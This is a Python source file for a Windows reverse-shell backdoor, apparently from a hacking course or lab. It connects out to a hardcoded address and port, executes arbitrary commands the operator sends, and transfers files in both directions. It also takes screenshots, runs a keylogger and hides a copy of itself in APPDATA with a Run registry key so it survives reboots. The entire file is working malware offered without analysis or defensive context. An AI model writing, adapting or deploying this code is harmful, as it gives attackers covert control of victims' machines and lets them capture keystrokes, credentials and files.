import json
import socket
import subprocess
import os
import sys
import pyautogui
import keylogger
import threading
import shutil
import time

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():

    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def download_file(file_name):
    file = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        file.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    file.close()

def upload_file(file_name):
    file = open(file_name, 'rb')
    s.send(file.read())

def screenshot():
    ss = pyautogui.screenshot()
    ss.save('screenshot.png')

def persist(reg_name, copy_name):
    file_location = os.environ['appdata'] + '\\' + copy_name
    try:
        if os.path.exists(file_location) != True:
            shutil.copy(sys.executable, file_location)
            subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
            reliable_send('[*] Persistence Added Successfully with Registry Name ' + reg_name)
        else:
            reliable_send('Persistence Already Exists!')
    except:
        reliable_send('[!!!] Error Creating Persistence With The Target Machine')

def connection():
    while True:
        time.sleep(20)
        try:
            s.connect(('192.168.92.95', 5555))
            shell()
            s.close()
            break
        except:
            connection()

def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'help':
            pass
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command == 'screenshot':
            screenshot()
            upload_file('screenshot.png')
            os.remove('screenshot.png')
        elif command[:12] == 'keylog_start':
            keylog = keylogger.Keylogger()
            t = threading.Thread(target=keylog.start)
            t.start()
            reliable_send('[*] Keylogger Started.')
        elif command == 'keylog_dump':
            logs = keylog.read_log()
            reliable_send(logs)
        elif command == 'keylog_stop':
            keylog.self_destruct()
            t.join()
            reliable_send('[*] Keylogger Stopped.')
        elif command[:12] == 'persistence ':
            reg_name, copy_name = command[13:].split(' ')
            persist(reg_name, copy_name)
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode().rstrip()
            reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()

